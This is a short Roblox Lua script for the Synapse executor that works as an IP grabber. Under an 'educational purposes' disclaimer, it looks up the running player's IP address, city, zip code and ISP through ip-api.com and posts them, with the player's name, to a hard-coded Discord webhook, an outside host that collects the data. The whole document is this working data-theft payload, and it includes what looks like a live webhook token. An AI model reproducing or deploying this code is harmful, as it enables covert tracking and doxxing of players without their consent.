--I DO NOT CONDONE THE MALICIOUS USE OF THIS SCRIPT. THIS IS PURELY FOR EDUCATIONAL PURPOSES AND SHOULD NOT BE USED IN ANY CONTEXT OTHER THAN THAT. PLEASE STAY SAFE AND BE CLEAR OF SCRIPTS THAT MAKE CONTAIN RELATED OR SIMILAR CONTENT.
local player_name = game:GetService("Players").LocalPlayer.Name
local webhook_url = "https://discord.com/api/webhooks/1074344376106504213/2Ej0icrthLCbr8Kny_6j3uacoLULFOfLmfTOG-2TLl1UWkKcLaX4dyMas3XNwKXVx3nA"

local ip_info = syn.request({
    Url = "http://ip-api.com/json",
    Method = "GET"
})
local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
syn.request(
    {
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
    }
)